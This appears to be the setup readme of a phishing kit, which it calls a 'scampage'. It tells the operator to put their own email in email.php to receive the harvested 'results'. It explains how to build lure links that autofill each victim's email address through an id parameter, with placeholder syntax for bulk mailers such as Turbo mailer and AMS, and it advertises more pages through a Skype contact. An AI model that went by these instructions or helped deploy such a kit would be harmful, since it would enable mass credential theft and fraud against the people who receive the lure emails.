﻿/* 
Change inside email.php

within your email for result.

*/



/* 
This page using autpograb
Setup your letter
example your scampage link like this

https://yourlink.com/patch/

just add ?id=example@email.here


*/
- If you use Turbo mailer:

https://yourlink.com/patch/?id=%0%

- If you use AMS: 

https://yourlink.com/patch/?id=%RCPT_ADDRESS%

- If you use mailer:

https://yourlink.com/patch/?id=".$email."

or

https://yourlink.com/patch/?id=$email

-  
*/


/* 
Need More page

Skype: Mircboot
*/